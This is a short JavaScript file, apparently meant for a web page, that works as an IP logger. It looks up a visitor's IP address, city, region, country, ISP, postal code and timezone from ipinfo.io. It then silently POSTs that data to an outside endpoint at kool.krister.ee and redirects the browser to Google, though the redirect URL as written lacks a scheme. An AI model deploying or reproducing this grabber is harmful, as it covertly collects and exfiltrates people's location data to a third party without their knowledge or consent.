async function fetchIPinfo() {

  const url = "https://ipinfo.io/json"
  const response = await fetch(url)
  const json = await response.json()
  const element = document.querySelector(".ip")

  element.innerHTML = ""
    const ip = json.ip
    const city = json.city
    const region = json.region
    const country = json.country
    const org = json.org
    const postal = json.postal
    const timezone = json.timezone

    

    const IPData = `IP: ${ip}, City: ${city}, Region: ${region}, Country: ${country}, Organization: ${org}, Postal: ${postal}, Timezone: ${timezone}`;
    element.innerHTML += "<p>" + IPData.replace(/, /g, "<br>") + "</p>";

    return IPData; 
  } 

  async function SendIPinfo(IPData) {
    const url = "https://kool.krister.ee/chat/IP"
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ IPData })
    })
    
  }

  async function main() {
    const ipData = await fetchIPinfo();
  
    if (ipData) {
      await SendIPinfo(ipData);
      window.location.href = "www.google.com";
    }
  }
  
main();